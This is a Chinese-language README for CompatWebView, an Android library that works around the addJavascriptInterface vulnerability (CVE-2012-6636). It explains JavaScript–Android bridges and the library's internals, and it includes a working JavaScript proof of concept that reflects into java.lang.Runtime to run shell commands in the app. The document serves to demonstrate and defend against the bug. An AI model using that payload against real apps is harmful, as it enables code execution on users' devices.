CompatWebView
-------------

CompatWebView是为了解决WebView的JavaScriptInterface注入漏洞
- [漏洞介绍：CVE-2012-6636](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-6636) [CVE-2013-4710](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4710)
- [官方说明：addJavaScriptInterface](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface)
    - This method can be used to allow JavaScript to control the host application. This is a powerful feature, but also presents a security risk for apps targeting JELLY_BEAN or earlier. Apps that target a version later than JELLY_BEAN are still vulnerable if the app runs on a device running Android earlier than 4.2. The most secure way to use this method is to target JELLY_BEAN_MR1 and to ensure the method is called only when running on Android 4.2 or later. With these older versions, **JavaScript could use reflection to access an injected object's public fields.** Use of this method in a WebView containing untrusted content could allow an attacker to manipulate the host application in unintended ways, executing Java code with the permissions of the host application. Use extreme care when using this method in a WebView which could contain untrusted content.

- 在Android的api小于17（android4.2）调用addJavaScriptInterface注入java对象会有安全风险，可以通过js注入反射调用到Java层的方法，造成安全隐患。[漏洞验证案例](https://github.com/heimashi/CompatWebView/blob/master/example/src/main/java/com/sw/bridge/InjectWebViewActivity.java)

- CompatWebView的解决方案：在大于等于android4.2中延用addJavaScriptInterface，在小于android4.2中采用另外的通道与js进行交互，同时保持api调用的一致性，
CompatWebView做到了对客户端开发透明，复用了原来addJavaScriptInterface的api，对前端开发也是透明的，前端不用写两套交互方式。




How to use
-----------
[使用案例](https://github.com/heimashi/CompatWebView/blob/master/example/src/main/java/com/sw/bridge/CompatWebViewActivity.java)
- 1、添加依赖
```groovy
implementation 'com.sw.compat.webview:compat-webview:1.0.0'
```
- 2、用CompatWebView替换原来的WebView，在需要调用addJavaScriptInterface()的地方替换成方法compatAddJavascriptInterface()
```java
webView.compatAddJavascriptInterface(new JInterface(), "JInterface");
```
- 3、如果需要自定义WebViewClient的话，必须继承自CompatWebViewClient来替换原来的WebViewClient，如果不自定义的话可以省掉此步骤
```java
webView.setWebViewClient(new CompatWebViewClient(){
    
});
```




漏洞验证案例
-----------
下面验证一下addJavaScriptInterface漏洞，详细代码见[漏洞验证案例](https://github.com/heimashi/CompatWebView/blob/master/example/src/main/java/com/sw/bridge/InjectWebViewActivity.java)
- 1、先定义一个JavascriptInterface
```java
public class JInterface {
    @JavascriptInterface
    public void testJsCallJava(String msg, int i) {
        Toast.makeText(MyApp.application, msg + ":" + (i + 20), Toast.LENGTH_SHORT).show();
    }
}
```
- 2、再将Interface通过addJavaScriptInterface添加到WebView
```java
webView.addJavascriptInterface(new JInterface(), "JInterface");
```
- 3、然后我们看看在Javascript中就可以通过查找window属性中的JInterface对象，然后反射执行一些攻击了，例如下面的例子通过反射Android中的Runtime类在应用中执行shell脚本。
```javascript
function testInjectBug(){
    var p = execute(["ls","/"]);
    console.log(convertStreamToString(p.getInputStream()));
}            
function execute(cmdArgs) {
    for (var obj in window) {
         if ("getClass" in window[obj]) {
              console.log("find:"+obj);
              return window[obj].getClass().forName("java.lang.Runtime").
                            getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
          }
    }
}
function convertStreamToString(inputStream) {
     var result = "";
     var i = inputStream.read();
     while(i != -1) {
          var tmp = String.fromCharCode(i);
          result += tmp;
          i = inputStream.read();
     }
     return result;
}            
```




JavaScript与Android通信
----------------------
在介绍CompatWebView原理之前，先总结一下Javascript与Android的通信方式
### JavaScript调用Android通信方式总结
总的来说JavaScript与Android native通信的方式有**三大类**：[使用案例](https://github.com/heimashi/CompatWebView/blob/master/example/src/main/java/com/sw/bridge/CommunicateWebViewActivity.java)
- **通过JavaScriptInterface注入java对象**
    - Android端注入
    ```java
      webView.addJavascriptInterface(new JInterface(), "JInterface");

      private static class JInterface {
        @JavascriptInterface
        public void testJsCallJava(String msg, int i) {
            Toast.makeText(MyApp.application, msg + ":" + (i + 20), Toast.LENGTH_SHORT).show();
        }
      }
    ```
    - JS端调用
    ```javascript
    JInterface.testJsCallJava("hello", 666)
    ```
- **通过WebViewClient，实现shouldOverrideUrlLoading**
    - Android端WebViewClient，复写shouldOverrideUrlLoading
    ```java
    webView.setWebViewClient(new WebViewClient() {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            try {
               url = URLDecoder.decode(url, "UTF-8");
            } catch (UnsupportedEncodingException e) {
               e.printStackTrace();
            }
            if (url.startsWith(SCHEME)) {
               Toast.makeText(CommunicateWebViewActivity.this, url, Toast.LENGTH_SHORT).show();
               return true;
            }
               return super.shouldOverrideUrlLoading(view, url);
        }
     }
    ```
    - JS端调用
    ```javascript
    document.location = "jtscheme://hello"
    window.location.href = "jtscheme://hello"
    ```
    - 或者通过H5标签
    ```html
    <a href="jtscheme://hello2?a=1&b=c">ShouldOverrideUrlLoading</a>
    <iframe src="jtscheme://hello2?a=1&b=c"/> 
    ```
- **通过WebChromeClient，这种有四种方式prompt(提示框)、alert(警告框)、confirm(确认框)、console(log控制台)**
    - Android端实现WebChromeClient
    ```java
    webView.setWebChromeClient(new WebChromeClient() {
        @Override
        public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) {
             Uri uri = Uri.parse(message);
             if (SCHEME.equals(uri.getScheme())) {
                  String authority = uri.getAuthority();
                  Set<String> params = uri.getQueryParameterNames();
                  for (String s : params) {
                      Log.i("COMPAT_WEB", s + ":" + uri.getQueryParameter(s));
                  }
                  Toast.makeText(MyApp.application, "Prompt::" + authority, Toast.LENGTH_SHORT).show();
             }
             return super.onJsPrompt(view, url, message, defaultValue, result);
        }
    
        @Override
        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
             Toast.makeText(MyApp.application, "Alert::" + message, Toast.LENGTH_SHORT).show();
             return super.onJsAlert(view, url, message, result);
        }
    
        @Override
        public boolean onJsConfirm(WebView view, String url, String message, JsResult result) {
             Toast.makeText(MyApp.application, "Confirm::" + message, Toast.LENGTH_SHORT).show();
             return super.onJsConfirm(view, url, message, result);
       }
    
       @Override
       public boolean onConsoleMessage(ConsoleMessage consoleMessage) {
             Toast.makeText(MyApp.application, "Console::" + consoleMessage.message(), Toast.LENGTH_SHORT).show();
             return super.onConsoleMessage(consoleMessage);
       }
    });
    ```
    - JS端调用
    ```javascript
    console.log("say hello by console");
    
    alert("say hello by alert");
    
    confirm("say hello by confirm");
    
    window.prompt("jtscheme://hello?a=1&b=hi");
    ```
- **总结：Javascript想通知Android的native层，除了JavascriptInterface以外，一般采用shouldOverrideUrlLoading和onJsPrompt这两种方式，console、alert和confirm这三个方法在Javascript中较常用不太适合。**


### Android调用JavaScript通信方式总结
Android native与JavaScript通信的方式有**两种:loadUrl()和evaluateJavascript()**
```java
webView.loadUrl("javascript:" + javascript);
webView.evaluateJavascript(javascript, null);
```
- evaluateJavascript(String script, ValueCallback<String> resultCallback)
- Asynchronously evaluates JavaScript in the context of the currently displayed page.[官方说明](https://developer.android.com/reference/android/webkit/WebView.html#evaluateJavascript%28java.lang.String,%20android.webkit.ValueCallback%3Cjava.lang.String%3E%29)
- 建议loadUrl()在低于18的版本中使用，在大于等于19版本中，应该使用evaluateJavascript()，如下面的例子所示[官方迁移说明](https://developer.android.com/guide/webapps/migrating.html)
```java
public void compatEvaluateJavascript(String javascript) {
    if (Build.VERSION.SDK_INT <= 18) {
        loadUrl("javascript:" + javascript);
    } else {
        evaluateJavascript(javascript, null);
    }
}
```



CompatWebView通信流程
--------------------
CompatWebView在api17及其以上延用了在addJavaScriptInterface，在小于api17中采用另外的通道与js进行交互，通过shouldOverrideUrlLoading通道来让js层通知到Android，通信流程如下：
- 1.Android层添加注入对象时调用compatAddJavaScriptInterface来添加JavaScriptInterface
- 2.在compatAddJavaScriptInterface中会去判断sdk的等级，大于等于17走原有的通道，小于17会先把该对象存起来
- 3.在网页加载完的时候，即onPageFinished回调中去解析上个步骤存起来的对象，把该对象和所有需要注入的方法解析出来，组织成为一段注入的js语句，类似如下：
    ```javascript
    window.JInterface = {};
    window.JInterface.testJsCallJava = function(param0,param1){
	       schemeEncode = encodeURIComponent("JInterface?fun=testJsCallJava&param0="+param0+"&param1="+param1);
	       window.location.href ="compatscheme://"+schemeEncode;
    };
    ```
- 4.将上面的js调用webView.loadUrl()注入到网页中
- 5.前端在需要调用的地方跟之前一样去调用
```javascript
JInterface.testJsCallJava("jsCallJava success", 20)
```
- 6.执行上面的js后Android端在shouldOverrideUrlLoading通道就会收到scheme，从scheme中解析出对象和对应的方法，然后再反射调用对应的方法就完成了本次通信


CompatWebView代码分析
--------------------
- 1.CompatWebView通过compatAddJavascriptInterface添加Interface对象，sdk版本大于等于17调用原生WebView的addJavascriptInterface，小于17的会把对象和对象名存在HashMap中
```java
public void compatAddJavascriptInterface(Object object, String name) {
    if (Build.VERSION.SDK_INT >= 17) {
        addJavascriptInterface(object, name);
    } else {
        injectHashMap.put(name, object);
    }
}
```
- 2.在网页加载完毕的时候会回答CompatWebViewClient中的onPageFinished方法，在方法中会判断如果sdk版本低于17会将调用CompatWebView的onPageFinished
```java
@Override
public void onPageFinished(WebView view, String url) {
    super.onPageFinished(view, url);
    if (Build.VERSION.SDK_INT < 17) {
        if (view instanceof CompatWebView) {
            ((CompatWebView) view).onPageFinished();
        }
    }
}
```
- 3.在onPageFinished中会遍历第一步中存入的HashMap对象，调用injectJsInterfaceForCompat来根据对象和对象名注入js
```java
void onPageFinished() {
    for (String name : injectHashMap.keySet()) {
        Object object = injectHashMap.get(name);
        injectJsInterfaceForCompat(object, name);
    }
}
```
- 4.injectJsInterfaceForCompat会根据对象实例反射出需要注入的对象以及该对象需要注入的方法，拼接出一段Js代码，然后调用loadUrl将Js注入到WebView中以供前端调用
```java
    private void injectJsInterfaceForCompat(Object object, String name) {
        Class clazz = object.getClass();
        Method[] methods = clazz.getMethods();
        if (methods == null) {
            return;
        }
        StringBuilder sb = new StringBuilder("window.").append(name).append(" = {};");
        for (Method method : methods) {
            if (!checkMethodValid(method)) {
                continue;
            }
            sb.append("window.").append(name).append(".");
            sb.append(method.getName()).append(" = function(");
            Class<?>[] parameterTypes = method.getParameterTypes();
            int paramSize = parameterTypes.length;
            List<String> paramList = new ArrayList<>();
            for (int i = 0; i < paramSize; i++) {
                String tmp = "param" + i;
                sb.append(tmp);
                paramList.add(tmp);
                if (i < (paramSize - 1)) {
                    sb.append(",");
                }
            }
            sb.append("){schemeEncode = encodeURIComponent(\"").append(name).append("?fun=").append(method.getName());
            if (paramList.size() == 0) {
                sb.append("\"");
            } else {
                for (int i = 0; i < paramList.size(); i++) {
                    sb.append("&").append(paramList.get(i)).append("=\"+").append(paramList.get(i));
                    if (i < (paramSize - 1)) {
                        sb.append("+\"");
                    }
                }
            }

            sb.append("); window.location.href =\"").append(scheme).append("://\"").append("+schemeEncode;};");
        }
        compatEvaluateJavascript(sb.toString());
    }
```
上面的Java代码拼接出来的Js串类似如下所示，目的是注入一个JInterface对象以及JInterface对象的testJsCallJava方法，在testJsCallJava方法中有一个与java中的testJsCallJava方法映射的scheme
```javascript
    window.JInterface = {};
    window.JInterface.testJsCallJava = function(param0,param1){
	       schemeEncode = encodeURIComponent("JInterface?fun=testJsCallJava&param0="+param0+"&param1="+param1);
	       window.location.href ="compatscheme://"+schemeEncode;
    };
```
- 5.完成上面的步骤后，Javascript端就可以像之前addJavascriptInterface一样的通过对象调用java方法了
```javascript
function testJsCallJava(){
	JInterface.testJsCallJava("jsCallJava success", 20)
}
```
- 6.js端调用了上面的函数后，在Android端的shouldOverrideUrlLoading通道就会收到scheme，在CompatWebViewClient中会收到回调，然后转发给CompatWebView
```java
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {
        if (Build.VERSION.SDK_INT < 17) {
            if (view instanceof CompatWebView) {
                if (((CompatWebView) view).shouldOverrideUrlLoading(url)) {
                    return true;
                }
            }
        }
        return super.shouldOverrideUrlLoading(view, url);
    }
```
- 7.在CompatWebView中会根据url解析出需要反射调用的对象以及对应的方法，然后反射执行该方法，这样就完成了sdk低于17的通信流程
```java
    boolean shouldOverrideUrlLoading(String url) {
        try {
            String urlDecode = URLDecoder.decode(url, "UTF-8");
            if (urlDecode.startsWith(scheme)) {
                JavaMethod javaMethod = decodeMethodFromUri(urlDecode);
                if (javaMethod == null) {
                    return false;
                }
                return javaMethod.invoke(injectHashMap);
            }
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return false;
    }
    private JavaMethod decodeMethodFromUri(String url) {
            if (url == null) {
                return null;
            }
            Uri decodeUri = Uri.parse(url);
            String dScheme = decodeUri.getScheme();
            String authority = decodeUri.getAuthority();
            Set<String> params = decodeUri.getQueryParameterNames();
            if (!scheme.equals(dScheme) || authority == null || !params.contains("fun")) {
                return null;
            }
            JavaMethod javaMethod = new JavaMethod();
            javaMethod.object = authority;
            javaMethod.methodName = decodeUri.getQueryParameter("fun");
            for (String name : params) {
                if ("fun".equals(name)) {
                    continue;
                }
                javaMethod.params.put(name, decodeUri.getQueryParameter(name));
            }
            return javaMethod;
        }

```


其他WebView漏洞
--------------

- [CVE-2014-1939](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1939)
- [CVE-2014-7224](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7224)
- [CNTA-2018-0005](http://www.cnvd.org.cn/webinfo/show/4365) setAllowFileAccessFromFileURLs setAllowUniversalAccessFromFileURLs
- 解决方案是在WebView中移除注入的对象，如下所示（CompatWebView中已移除），同时，setAllowFileAccessFromFileURLs和setAllowUniversalAccessFromFileURLs要设置为false或者加白名单。
```java
removeJavascriptInterface("searchBoxJavaBridge_");
removeJavascriptInterface("accessibility");
removeJavascriptInterface("accessibilityTraversal");
```